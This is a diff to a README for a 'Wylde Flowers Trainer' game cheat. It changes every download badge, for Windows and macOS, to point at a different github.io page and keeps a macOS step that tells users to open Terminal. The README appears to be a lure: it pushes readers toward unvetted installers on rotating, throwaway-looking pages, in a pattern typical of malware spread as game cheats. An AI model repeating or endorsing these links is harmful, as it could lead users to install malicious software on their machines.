@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Wylde Flowers Trainer](https://img.shields.io/badge/⬇_Download_Wylde%20Flowers_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Wylde Flowers Trainer](https://img.shields.io/badge/⬇_Download_Wylde%20Flowers_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
 
 </div>
 
@@ -74,9 +74,9 @@ Wylde Flowers is a cozy farming and witchcraft simulation where you move to a co
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
 
 </div>
 
@@ -97,7 +97,7 @@ Wylde Flowers is a cozy farming and witchcraft simulation where you move to a co
 
 <div align="center">
 
-[![⬇ Download Wylde Flowers Trainer](https://img.shields.io/badge/⬇_Download_Wylde%20Flowers_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Wylde Flowers Trainer](https://img.shields.io/badge/⬇_Download_Wylde%20Flowers_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
 
 </div>
 
@@ -129,7 +129,7 @@ Wylde Flowers is a cozy farming and witchcraft simulation where you move to a co
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -154,7 +154,7 @@ Wylde Flowers is a cozy farming and witchcraft simulation where you move to a co
 
 <div align="center">
 
-[![⬇ Download Wylde Flowers Trainer](https://img.shields.io/badge/⬇_Download_Wylde%20Flowers_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Wylde Flowers Trainer](https://img.shields.io/badge/⬇_Download_Wylde%20Flowers_Trainer-E63946?style=for-the-badge&logo=github)](https://bansheeloaderquay.github.io/dl-win/)
 
 </div>
 
